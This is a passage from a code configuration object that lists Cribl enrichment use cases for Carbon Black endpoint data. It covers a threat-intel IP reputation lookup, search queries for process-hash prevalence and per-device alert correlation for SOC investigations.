          lookupSample: 'ip,reputation,threat_category,source,is_tor\n198.51.100.50,malicious,c2-server,AlienVault-OTX,false\n203.0.113.99,malicious,malware-distribution,Abuse.ch,false\n185.220.101.1,suspicious,tor-exit,TorProject,true\n45.33.32.156,clean,scanner,Shodan-Known,false',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: threat_intel_ips.csv\n// Input: netconn_remote_ip → ip (exact match)\n// Output: reputation → dest_reputation, threat_category → dest_threat_category, source → dest_threat_source, is_tor → dest_is_tor\n//\n// Add Eval for unmatched: dest_reputation = dest_reputation || \'unknown\'\n//\n// Result: { netconn_remote_ip: "198.51.100.50", dest_reputation: "malicious", dest_threat_category: "c2-server", dest_is_tor: "false" }',
          notes: 'Aggregate multiple threat intel feeds (OTX, Abuse.ch, STIX/TAXII). Update frequently (15-minute reload). Large lookups (>1M IPs) may need Redis-backed lookup for performance.'
        }
      }
    ],
    searchTime: [
      {
        name: 'Historical Process Execution',
        description: 'At investigation time, search for all historical executions of a specific process hash or process name across the fleet to determine prevalence and first-seen date.',
        criblFunction: 'Search-time lookup',
        addedFields: ['hash_first_seen', 'hash_prevalence', 'hash_endpoints'],
        securityValue: 'Determines if a binary is rare (executed on 1 endpoint = likely malicious) or common (executed on 500 endpoints = likely legitimate). First-seen date helps establish timeline for compromise.',
        personas: ['Incident Response', 'Threat Hunting', 'SOC'],
        implementation: {
          example: '// Cribl Search query for hash prevalence:\n// dataset="carbon_black" type="procstart" earliest=-30d\n// | where process_hash == "$SUSPECT_HASH"\n// | summarize FirstSeen=min(event_timestamp), LastSeen=max(event_timestamp), Endpoints=dcount(device_name), Executions=count() by process_hash, process_name\n// | extend Prevalence = iif(Endpoints > 100, "common", iif(Endpoints > 10, "moderate", "rare"))\n//\n// For process name prevalence:\n// dataset="carbon_black" type="procstart" process_name="$PROCESS" earliest=-7d\n// | summarize Executions=count(), UniqueHashes=dcount(process_hash), Endpoints=dcount(device_name) by process_name\n// | extend HashDiversity = iif(UniqueHashes > 3, "multiple_versions", "single_version")',
          notes: 'Hash prevalence is one of the strongest indicators of maliciousness. Rare hashes (1-3 endpoints) combined with suspicious behavior = high confidence malicious. Run prevalence checks as part of every alert investigation.'
        }
      },
      {
        name: 'Device Alert Correlation',
        description: 'At investigation time, correlate all CB alerts for a specific device over a time window to identify multi-stage attack patterns and alert fatigue sources.',
        criblFunction: 'Search-time lookup',
        addedFields: ['device_alert_count', 'device_alert_severities', 'device_ttp_coverage'],
        securityValue: 'Reveals whether a device is experiencing isolated events or a coordinated multi-stage attack. Multiple TTPs on one device in a short window = active compromise. Also identifies noisy devices generating alert fatigue.',
        personas: ['Incident Response', 'SOC', 'Threat Hunting', 'Security Engineering'],
        implementation: {
          example: '// Cribl Search query for device alert correlation:\n// dataset="carbon_black" alert_id!="" device_name="$DEVICE" earliest=-48h\n// | summarize AlertCount=count(), Severities=makeset(alert_severity), TTPs=makeset(ttp), Processes=makeset(process_name) by device_name\n// | extend RiskLevel = iif(AlertCount > 10 and dcount(TTPs) > 3, "active_compromise", iif(AlertCount > 5, "elevated", "normal"))\n//\n// For fleet-wide alert correlation:\n// dataset="carbon_black" alert_id!="" earliest=-24h\n// | summarize AlertCount=count(), UniqueTTPs=dcount(ttp), MaxSeverity=max(alert_severity) by device_name\n// | where AlertCount > 5\n// | order by MaxSeverity desc, AlertCount desc',
          notes: 'Combine with process tree reconstruction for full kill chain visibility. Devices with >10 alerts spanning 3+ MITRE tactics in 24h are strong indicators of active compromise requiring immediate response.'
        }
      }
    ]
  }
};
